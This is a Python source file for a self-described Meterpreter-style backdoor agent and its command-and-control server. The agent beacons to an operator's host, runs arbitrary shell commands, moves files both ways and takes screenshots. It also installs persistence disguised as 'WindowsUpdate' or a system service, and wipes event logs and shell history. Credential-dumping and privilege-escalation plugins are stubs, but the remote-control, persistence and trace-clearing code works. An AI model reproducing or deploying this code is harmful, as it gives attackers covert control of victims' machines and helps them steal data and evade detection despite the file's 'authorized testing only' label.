#!/usr/bin/env python3
"""
Meterpreter-Style Python Backdoor
Advanced post-exploitation agent with multiple transport protocols
For authorized security testing and educational purposes only
"""
import sys
import os
import socket
import ssl
import json
import time
import struct
import base64
import hashlib
import threading
import subprocess
import platform
import ctypes
import random
import string
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

class MeterpreterAgent:
    """Advanced Meterpreter-style backdoor agent"""
    
    def __init__(self):
        self.session_id = self.generate_session_id()
        self.transport = None
        self.server_host = None
        self.server_port = None
        self.running = True
        self.interval = 5  # Beacon interval
        self.jitter = 0.2  # Jitter percentage
        self.encryption_key = hashlib.sha256(b"meterpreter_key_2024").digest()
        
        # Agent capabilities
        self.capabilities = {
            'shell': True,
            'file': True,
            'process': True,
            'network': True,
            'registry': platform.system() == 'Windows',
            'screenshot': True,
            'keylogger': False,  # Disabled by default
            'webcam': False,     # Disabled by default
            'migrate': True,
            'persist': True,
            'cleanup': True
        }
        
        # Load plugins
        self.plugins = {}
        self.load_builtin_plugins()
    
    def generate_session_id(self):
        """Generate unique session ID"""
        hostname = socket.gethostname()
        uid = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{hostname}_{uid}"
    
    def load_builtin_plugins(self):
        """Load built-in plugins"""
        self.plugins = {
            'stdapi': StdapiPlugin(self),
            'priv': PrivPlugin(self),
            'kiwi': KiwiPlugin(self),
            'incognito': IncognitoPlugin(self),
            'espia': EspiaPlugin(self),
        }
    
    def encrypt(self, data):
        """Encrypt data with AES-like XOR cipher"""
        if isinstance(data, str):
            data = data.encode()
        
        # Add random prefix
        prefix = os.urandom(16)
        data = prefix + data
        
        # XOR encryption
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
        
        return base64.b64encode(bytes(encrypted)).decode()
    
    def decrypt(self, data):
        """Decrypt data"""
        try:
            decoded = base64.b64decode(data)
            
            decrypted = bytearray()
            for i, byte in enumerate(decoded):
                decrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
            
            # Remove random prefix
            return bytes(decrypted[16:])
        except:
            return data
    
    def get_system_info(self):
        """Get comprehensive system information"""
        info = {
            'session_id': self.session_id,
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'os_release': platform.release(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': sys.version,
            'pid': os.getpid(),
            'ppid': os.getppid(),
            'uid': self.get_uid(),
            'username': self.get_username(),
            'domain': self.get_domain(),
            'internal_ip': self.get_internal_ip(),
            'external_ip': self.get_external_ip(),
            'privileges': self.get_privileges(),
            'is_admin': self.is_admin(),
            'integrity_level': self.get_integrity_level(),
            'process_arch': platform.architecture()[0],
            'system_arch': platform.machine(),
            'language': self.get_system_language(),
            'timezone': time.tzname[0],
            'uptime': self.get_uptime(),
            'drives': self.get_drives(),
            'users': self.get_local_users(),
            'network': self.get_network_info()
        }
        return info
    
    def get_uid(self):
        """Get user ID"""
        try:
            if platform.system() == 'Windows':
                return os.getenv('USERNAME')
            else:
                return str(os.getuid())
        except:
            return 'Unknown'
    
    def get_username(self):
        """Get username"""
        try:
            if platform.system() == 'Windows':
                return os.getenv('USERNAME')
            else:
                import pwd
                return pwd.getpwuid(os.getuid()).pw_name
        except:
            return os.getenv('USER', 'Unknown')
    
    def get_domain(self):
        """Get domain name"""
        try:
            if platform.system() == 'Windows':
                return os.getenv('USERDOMAIN', 'WORKGROUP')
            else:
                return socket.getfqdn().split('.', 1)[-1] if '.' in socket.getfqdn() else 'WORKGROUP'
        except:
            return 'Unknown'
    
    def get_internal_ip(self):
        """Get internal IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def get_external_ip(self):
        """Get external IP address"""
        try:
            import urllib.request
            response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
            return response.read().decode()
        except:
            return 'Unknown'
    
    def get_privileges(self):
        """Get current privileges"""
        privs = []
        try:
            if platform.system() == 'Windows':
                import win32security
                token = win32security.OpenProcessToken(
                    win32security.GetCurrentProcess(),
                    win32security.TOKEN_QUERY
                )
                for priv in token.GetTokenInformation(win32security.TokenPrivileges):
                    privs.append(priv[0])
            else:
                if os.getuid() == 0:
                    privs.append('root')
                else:
                    privs.append('standard')
        except:
            privs.append('unknown')
        return privs
    
    def is_admin(self):
        """Check if running as administrator"""
        try:
            if platform.system() == 'Windows':
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            else:
                return os.getuid() == 0
        except:
            return False
    
    def get_integrity_level(self):
        """Get Windows integrity level"""
        if platform.system() != 'Windows':
            return 'N/A'
        
        try:
            import win32security
            token = win32security.OpenProcessToken(
                win32security.GetCurrentProcess(),
                win32security.TOKEN_QUERY
            )
            sid = token.GetTokenInformation(win32security.TokenIntegrityLevel)
            
            levels = {
                'S-1-16-0': 'Untrusted',
                'S-1-16-4096': 'Low',
                'S-1-16-8192': 'Medium',
                'S-1-16-12288': 'High',
                'S-1-16-16384': 'System'
            }
            return levels.get(sid, 'Unknown')
        except:
            return 'Unknown'
    
    def get_system_language(self):
        """Get system language"""
        try:
            if platform.system() == 'Windows':
                import locale
                return locale.getdefaultlocale()[0]
            else:
                return os.getenv('LANG', 'Unknown')
        except:
            return 'Unknown'
    
    def get_uptime(self):
        """Get system uptime"""
        try:
            if platform.system() == 'Windows':
                # Windows uptime calculation
                import ctypes
                kernel32 = ctypes.windll.kernel32
                return kernel32.GetTickCount64() // 1000
            else:
                with open('/proc/uptime', 'r') as f:
                    return float(f.readline().split()[0])
        except:
            return 0
    
    def get_drives(self):
        """Get available drives"""
        drives = []
        try:
            if platform.system() == 'Windows':
                import win32api
                drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
            else:
                drives.append('/')
                try:
                    import shutil
                    total, used, free = shutil.disk_usage('/')
                    drives.append(f"Total: {total//(1024**3)}GB, Free: {free//(1024**3)}GB")
                except:
                    pass
        except:
            pass
        return drives
    
    def get_local_users(self):
        """Get local user accounts"""
        users = []
        try:
            if platform.system() == 'Windows':
                import win32net
                users = [u['name'] for u in win32net.NetUserEnum(None, 0)[0]]
            else:
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        if not line.startswith('#'):
                            users.append(line.split(':')[0])
        except:
            pass
        return users[:20]  # Limit to 20
    
    def get_network_info(self):
        """Get network information"""
        info = {}
        try:
            hostname = socket.gethostname()
            info['hostname'] = hostname
            info['ip'] = socket.gethostbyname(hostname)
            info['fqdn'] = socket.getfqdn()
        except:
            pass
        return info
    
    def tcp_transport(self, host, port):
        """TCP transport with reconnection"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((host, int(port)))
                
                # Register with C2
                register_msg = json.dumps({
                    'type': 'register',
                    'session_id': self.session_id,
                    'info': self.get_system_info()
                })
                sock.send(self.encrypt(register_msg).encode())
                
                # Main communication loop
                while self.running:
                    try:
                        # Receive task
                        data = sock.recv(4096)
                        if not data:
                            break
                        
                        task = json.loads(self.decrypt(data))
                        
                        # Execute task
                        result = self.execute_task(task)
                        
                        # Send result
                        response = json.dumps({
                            'session_id': self.session_id,
                            'task_id': task.get('task_id'),
                            'result': result
                        })
                        sock.send(self.encrypt(response).encode())
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                sock.close()
                
            except Exception as e:
                pass
            
            # Wait before reconnecting
            time.sleep(self.interval)
    
    def http_transport(self, host, port):
        """HTTP/HTTPS transport with beaconing"""
        base_url = f"http{'s' if port == '443' else ''}://{host}:{port}"
        
        while self.running:
            try:
                # Check in with C2
                import urllib.request
                
                checkin_data = json.dumps({
                    'type': 'checkin',
                    'session_id': self.session_id,
                    'info': self.get_system_info()
                }).encode()
                
                req = urllib.request.Request(
                    f"{base_url}/checkin",
                    data=checkin_data,
                    headers={'Content-Type': 'application/json'}
                )
                
                response = urllib.request.urlopen(req, timeout=30)
                tasks = json.loads(response.read().decode())
                
                # Execute tasks
                for task in tasks.get('tasks', []):
                    result = self.execute_task(task)
                    
                    # Send result
                    result_data = json.dumps({
                        'session_id': self.session_id,
                        'task_id': task.get('task_id'),
                        'result': result
                    }).encode()
                    
                    urllib.request.urlopen(
                        urllib.request.Request(
                            f"{base_url}/result",
                            data=result_data,
                            headers={'Content-Type': 'application/json'}
                        ),
                        timeout=30
                    )
                
            except Exception as e:
                pass
            
            # Calculate beacon time with jitter
            jitter_time = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(jitter_time)
    
    def execute_task(self, task):
        """Execute a task from C2"""
        task_type = task.get('type', '')
        task_data = task.get('data', {})
        
        try:
            if task_type == 'shell':
                return self.execute_shell(task_data.get('command'))
            
            elif task_type == 'sysinfo':
                return self.get_system_info()
            
            elif task_type == 'upload':
                return self.handle_upload(task_data)
            
            elif task_type == 'download':
                return self.handle_download(task_data)
            
            elif task_type == 'screenshot':
                return self.take_screenshot()
            
            elif task_type == 'migrate':
                return self.migrate_process(task_data.get('pid'))
            
            elif task_type == 'persist':
                return self.install_persistence(task_data.get('method'))
            
            elif task_type == 'cleanup':
                return self.cleanup()
            
            elif task_type == 'kill':
                self.running = False
                return {'status': 'killed'}
            
            elif task_type in self.plugins:
                return self.plugins[task_type].execute(task_data)
            
            else:
                return {'error': f'Unknown task type: {task_type}'}
            
        except Exception as e:
            return {'error': str(e)}
    
    def execute_shell(self, command):
        """Execute shell command"""
        try:
            if platform.system() == 'Windows':
                proc = subprocess.Popen(
                    'cmd.exe',
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                proc = subprocess.Popen(
                    ['/bin/bash', '-c', command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            stdout, stderr = proc.communicate(timeout=30)
            
            return {
                'stdout': stdout.decode('utf-8', errors='ignore'),
                'stderr': stderr.decode('utf-8', errors='ignore'),
                'return_code': proc.returncode
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_upload(self, data):
        """Handle file upload"""
        try:
            filepath = data['path']
            content = base64.b64decode(data['content'])
            
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            with open(filepath, 'wb') as f:
                f.write(content)
            
            return {'status': 'success', 'path': filepath, 'size': len(content)}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_download(self, data):
        """Handle file download"""
        try:
            filepath = data['path']
            
            if not os.path.exists(filepath):
                return {'error': 'File not found'}
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            return {
                'status': 'success',
                'path': filepath,
                'size': len(content),
                'content': base64.b64encode(content).decode()
            }
        except Exception as e:
            return {'error': str(e)}
    
    def take_screenshot(self):
        """Take screenshot"""
        try:
            # Implementation depends on platform
            if platform.system() == 'Windows':
                # Windows screenshot implementation
                import win32gui
                import win32ui
                import win32con
                from PIL import Image
                import io
                
                hdesktop = win32gui.GetDesktopWindow()
                width = win32gui.GetSystemMetrics(win32con.SM_CXSCREEN)
                height = win32gui.GetSystemMetrics(win32con.SM_CYSCREEN)
                
                desktop_dc = win32gui.GetWindowDC(hdesktop)
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                
                screenshot = win32ui.CreateBitmap()
                screenshot.CreateCompatibleBitmap(img_dc, width, height)
                mem_dc.SelectObject(screenshot)
                mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
                
                bmpinfo = screenshot.GetInfo()
                bmpstr = screenshot.GetBitmapBits(True)
                
                im = Image.frombuffer(
                    'RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
                    bmpstr, 'raw', 'BGRX', 0, 1
                )
                
                buffer = io.BytesIO()
                im.save(buffer, format='PNG')
                
                return {
                    'status': 'success',
                    'format': 'PNG',
                    'data': base64.b64encode(buffer.getvalue()).decode()
                }
            else:
                return {'error': 'Screenshot not supported on this platform'}
        except Exception as e:
            return {'error': str(e)}
    
    def migrate_process(self, target_pid):
        """Migrate to another process"""
        try:
            # This is a simplified representation
            # Real process migration is more complex
            return {
                'status': 'simulated',
                'message': f'Migration to PID {target_pid} simulated'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def install_persistence(self, method=None):
        """Install persistence"""
        methods_installed = []
        
        try:
            if platform.system() == 'Windows':
                # Registry persistence
                if not method or method == 'registry':
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(
                            regkey, "WindowsUpdate", 0, winreg.REG_SZ,
                            f'{sys.executable} {os.path.abspath(__file__)}'
                        )
                    methods_installed.append('registry')
                
                # Scheduled task
                if not method or method == 'schtask':
                    os.system(
                        f'schtasks /create /tn "WindowsUpdate" '
                        f'/tr "{sys.executable} {os.path.abspath(__file__)}" '
                        f'/sc onstart /ru SYSTEM /f'
                    )
                    methods_installed.append('schtask')
            
            elif platform.system() == 'Linux':
                # Crontab
                if not method or method == 'cron':
                    cron_line = f"@reboot {sys.executable} {os.path.abspath(__file__)} &\n"
                    os.system(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -')
                    methods_installed.append('cron')
                
                # Systemd
                if not method or method == 'systemd':
                    service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
"""
                    service_path = '/etc/systemd/system/system-service.service'
                    try:
                        with open(service_path, 'w') as f:
                            f.write(service_content)
                        os.system('systemctl enable system-service.service')
                        methods_installed.append('systemd')
                    except:
                        pass
            
            return {
                'status': 'success',
                'methods': methods_installed
            }
        except Exception as e:
            return {'error': str(e)}
    
    def cleanup(self):
        """Clean traces"""
        cleaned = []
        
        try:
            # Clear logs
            if platform.system() == 'Windows':
                os.system('wevtutil cl Application 2>nul')
                os.system('wevtutil cl Security 2>nul')
                os.system('wevtutil cl System 2>nul')
                cleaned.append('event_logs')
            else:
                os.system('history -c 2>/dev/null')
                os.system('rm -f ~/.bash_history 2>/dev/null')
                cleaned.append('bash_history')
            
            return {
                'status': 'success',
                'cleaned': cleaned
            }
        except Exception as e:
            return {'error': str(e)}
    
    def run(self, transport='tcp', host='127.0.0.1', port=4444):
        """Run the agent"""
        self.server_host = host
        self.server_port = port
        
        print(f"[*] Meterpreter Agent {self.session_id}")
        print(f"[*] Transport: {transport.upper()}")
        print(f"[*] Target: {host}:{port}")
        
        if transport == 'tcp':
            self.tcp_transport(host, port)
        elif transport in ['http', 'https']:
            self.http_transport(host, port)

class StdapiPlugin:
    """Standard API plugin"""
    def __init__(self, agent):
        self.agent = agent
    
    def execute(self, data):
        command = data.get('command', '')
        
        if command == 'sysinfo':
            return self.agent.get_system_info()
        elif command == 'shell':
            return self.agent.execute_shell(data.get('cmd', ''))
        elif command == 'ls':
            path = data.get('path', '.')
            try:
                files = []
                for f in os.listdir(path):
                    full_path = os.path.join(path, f)
                    stat = os.stat(full_path)
                    files.append({
                        'name': f,
                        'size': stat.st_size,
                        'is_dir': os.path.isdir(full_path),
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                return {'files': files}
            except Exception as e:
                return {'error': str(e)}
        else:
            return {'error': 'Unknown command'}

class PrivPlugin:
    """Privilege escalation plugin"""
    def __init__(self, agent):
        self.agent = agent
    
    def execute(self, data):
        technique = data.get('technique', '')
        
        if technique == 'getsystem':
            return self.getsystem()
        elif technique == 'bypassuac':
            return self.bypassuac()
        else:
            return {'error': 'Unknown technique'}
    
    def getsystem(self):
        """Attempt to get SYSTEM privileges"""
        # This is a placeholder - real implementation would use various techniques
        return {
            'status': 'simulated',
            'message': 'getsystem simulation - requires platform-specific implementation'
        }
    
    def bypassuac(self):
        """Attempt UAC bypass"""
        return {
            'status': 'simulated',
            'message': 'UAC bypass simulation'
        }

class KiwiPlugin:
    """Mimikatz-style credential dumping plugin"""
    def __init__(self, agent):
        self.agent = agent
    
    def execute(self, data):
        command = data.get('command', '')
        
        if command == 'creds_all':
            return self.dump_credentials()
        elif command == 'creds_wdigest':
            return self.dump_wdigest()
        elif command == 'creds_lsa':
            return self.dump_lsa()
        else:
            return {'error': 'Unknown command'}
    
    def dump_credentials(self):
        """Dump credentials (placeholder)"""
        return {
            'status': 'simulated',
            'message': 'Credential dumping simulation - requires platform-specific implementation'
        }
    
    def dump_wdigest(self):
        """Dump WDigest credentials"""
        return {'status': 'simulated', 'message': 'WDigest dump simulation'}
    
    def dump_lsa(self):
        """Dump LSA secrets"""
        return {'status': 'simulated', 'message': 'LSA dump simulation'}

class IncognitoPlugin:
    """Token manipulation plugin"""
    def __init__(self, agent):
        self.agent = agent
    
    def execute(self, data):
        command = data.get('command', '')
        
        if command == 'list_tokens':
            return self.list_tokens()
        elif command == 'impersonate_token':
            return self.impersonate_token(data.get('token'))
        else:
            return {'error': 'Unknown command'}
    
    def list_tokens(self):
        """List available tokens"""
        return {
            'status': 'simulated',
            'message': 'Token listing simulation'
        }
    
    def impersonate_token(self, token):
        """Impersonate a token"""
        return {
            'status': 'simulated',
            'message': f'Token impersonation simulation: {token}'
        }

class EspiaPlugin:
    """Screenshot and keylogging plugin"""
    def __init__(self, agent):
        self.agent = agent
    
    def execute(self, data):
        command = data.get('command', '')
        
        if command == 'screenshot':
            return self.agent.take_screenshot()
        elif command == 'keylog_start':
            return {'status': 'simulated', 'message': 'Keylogger simulation'}
        else:
            return {'error': 'Unknown command'}

class MeterpreterC2:
    """Command and Control server for Meterpreter agents"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = int(port)
        self.sessions = {}
        self.tasks = {}
        self.results = {}
        self.encryption_key = hashlib.sha256(b"meterpreter_key_2024").digest()
    
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, str):
            data = data.encode()
        prefix = os.urandom(16)
        data = prefix + data
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
        return base64.b64encode(bytes(encrypted)).decode()
    
    def decrypt(self, data):
        """Decrypt data"""
        try:
            decoded = base64.b64decode(data)
            decrypted = bytearray()
            for i, byte in enumerate(decoded):
                decrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
            return bytes(decrypted[16:])
        except:
            return data
    
    def handle_tcp_agent(self, client, addr):
        """Handle TCP agent connection"""
        try:
            # Receive registration
            data = client.recv(4096)
            if data:
                msg = json.loads(self.decrypt(data))
                session_id = msg.get('session_id')
                system_info = msg.get('info', {})
                
                self.sessions[session_id] = {
                    'client': client,
                    'addr': addr,
                    'info': system_info,
                    'last_seen': time.time()
                }
                
                print(f"\n[+] New session: {session_id}")
                print(f"    Hostname: {system_info.get('hostname', 'Unknown')}")
                print(f"    OS: {system_info.get('os', 'Unknown')}")
                print(f"    User: {system_info.get('username', 'Unknown')}")
                
                # Send acknowledgment
                client.send(self.encrypt(json.dumps({'status': 'registered'})))
                
                # Task loop
                while True:
                    try:
                        # Check for pending tasks
                        if session_id in self.tasks and self.tasks[session_id]:
                            task = self.tasks[session_id].pop(0)
                            client.send(self.encrypt(json.dumps(task)))
                            
                            # Wait for result
                            result_data = client.recv(8192)
                            if result_data:
                                result = json.loads(self.decrypt(result_data))
                                self.results[session_id] = self.results.get(session_id, [])
                                self.results[session_id].append(result)
                        else:
                            time.sleep(0.5)
                    
                    except Exception as e:
                        break
        
        except Exception as e:
            print(f"[-] Error with {addr}: {e}")
        finally:
            client.close()
            if session_id in self.sessions:
                del self.sessions[session_id]
                print(f"[-] Session closed: {session_id}")
    
    def start_tcp_listener(self):
        """Start TCP C2 listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(10)
        
        print(f"\n[*] Meterpreter C2 listening on {self.host}:{self.port}")
        print("[*] Waiting for agents...\n")
        
        while True:
            try:
                client, addr = server.accept()
                
                handler = threading.Thread(
                    target=self.handle_tcp_agent,
                    args=(client, addr),
                    daemon=True
                )
                handler.start()
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error: {e}")
        
        server.close()
    
    def interactive_console(self):
        """Interactive C2 console"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║              Meterpreter C2 Console                          ║
╠══════════════════════════════════════════════════════════════╣
║ Commands:                                                    ║
║   sessions       - List active sessions                      ║
║   interact <id>  - Interact with session                     ║
║   exit           - Exit console                              ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        while True:
            try:
                cmd = input("\nmsf> ").strip()
                
                if cmd == 'sessions':
                    print("\n[*] Active Sessions:")
                    for sid, session in self.sessions.items():
                        info = session['info']
                        print(f"    {sid}: {info.get('hostname')} @ {info.get('username')}")
                
                elif cmd.startswith('interact '):
                    session_id = cmd.split(' ', 1)[1]
                    if session_id in self.sessions:
                        self.interact_with_session(session_id)
                    else:
                        print(f"[-] Session not found: {session_id}")
                
                elif cmd == 'exit':
                    print("[*] Exiting...")
                    break
                
                else:
                    print(f"[-] Unknown command: {cmd}")
            
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def interact_with_session(self, session_id):
        """Interact with a specific session"""
        print(f"\n[*] Interacting with {session_id}")
        print("[*] Type 'background' to return\n")
        
        while True:
            try:
                cmd = input(f"[{session_id}]> ").strip()
                
                if cmd == 'background':
                    break
                elif cmd == 'help':
                    print("""
Commands:
    background      - Return to main console
    sysinfo         - Get system information
    shell <cmd>     - Execute shell command
    screenshot      - Take screenshot
    migrate <pid>   - Migrate to process
    persist         - Install persistence
    cleanup         - Clean traces
    kill            - Terminate session
                    """)
                elif cmd == 'kill':
                    self.add_task(session_id, 'kill', {})
                    break
                elif cmd.startswith('shell '):
                    self.add_task(session_id, 'shell', {'command': cmd[6:]})
                    result = self.get_result(session_id)
                    if result:
                        print(result.get('stdout', result.get('error', '')))
                elif cmd in ['sysinfo', 'screenshot', 'persist', 'cleanup']:
                    self.add_task(session_id, cmd, {})
                    result = self.get_result(session_id)
                    if result:
                        print(json.dumps(result, indent=2))
                else:
                    # Execute as shell command
                    self.add_task(session_id, 'shell', {'command': cmd})
                    result = self.get_result(session_id)
                    if result:
                        print(result.get('stdout', result.get('error', '')))
            
            except KeyboardInterrupt:
                print("\n[*] Type 'background' to return")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def add_task(self, session_id, task_type, task_data):
        """Add task for session"""
        if session_id not in self.tasks:
            self.tasks[session_id] = []
        
        self.tasks[session_id].append({
            'task_id': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
            'type': task_type,
            'data': task_data
        })
    
    def get_result(self, session_id, timeout=30):
        """Get result from session"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if session_id in self.results and self.results[session_id]:
                return self.results[session_id].pop(0)
            time.sleep(0.1)
        
        return {'error': 'Timeout waiting for result'}
    
    def start(self):
        """Start C2 server"""
        # Start TCP listener in thread
        listener_thread = threading.Thread(
            target=self.start_tcp_listener,
            daemon=True
        )
        listener_thread.start()
        
        # Start interactive console
        self.interactive_console()

def main():
    if len(sys.argv) < 2:
        print("""
╔══════════════════════════════════════════════════════════════╗
║         Meterpreter-Style Python Backdoor                    ║
╠══════════════════════════════════════════════════════════════╣
║ Usage:                                                       ║
║   python meterpreter.py <mode> [options]                     ║
║                                                              ║
║ Modes:                                                       ║
║   agent     - Start backdoor agent                           ║
║   server    - Start C2 server                                ║
║                                                              ║
║ Options:                                                     ║
║   --host <ip>       - C2 server IP                           ║
║   --port <port>     - C2 server port                         ║
║   --transport <t>   - Transport: tcp/http/https (tcp)       ║
║   --interval <n>    - Beacon interval in seconds (5)         ║
║   --jitter <n>      - Jitter percentage (0.2)               ║
║                                                              ║
║ Examples:                                                    ║
║   Server:                                                    ║
║     python meterpreter.py server --host 0.0.0.0 --port 4444  ║
║                                                              ║
║   Agent:                                                     ║
║     python meterpreter.py agent --host 10.0.0.1 --port 4444  ║
║                                                              ║
║   HTTP Agent:                                                ║
║     python meterpreter.py agent --host 10.0.0.1 --port 80 \\ ║
║              --transport http --interval 10                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        sys.exit(1)
    
    mode = sys.argv[1]
    
    # Parse arguments
    args = {}
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--host' and i + 1 < len(sys.argv):
            args['host'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--port' and i + 1 < len(sys.argv):
            args['port'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--transport' and i + 1 < len(sys.argv):
            args['transport'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--interval' and i + 1 < len(sys.argv):
            args['interval'] = float(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '--jitter' and i + 1 < len(sys.argv):
            args['jitter'] = float(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    print("[!] WARNING: For authorized security testing only!")
    
    if mode == 'server':
        host = args.get('host', '0.0.0.0')
        port = args.get('port', 4444)
        
        c2 = MeterpreterC2(host, port)
        c2.start()
    
    elif mode == 'agent':
        host = args.get('host', '127.0.0.1')
        port = args.get('port', 4444)
        transport = args.get('transport', 'tcp')
        
        agent = MeterpreterAgent()
        agent.interval = args.get('interval', 5)
        agent.jitter = args.get('jitter', 0.2)
        agent.run(transport, host, port)

if __name__ == "__main__":
    main()
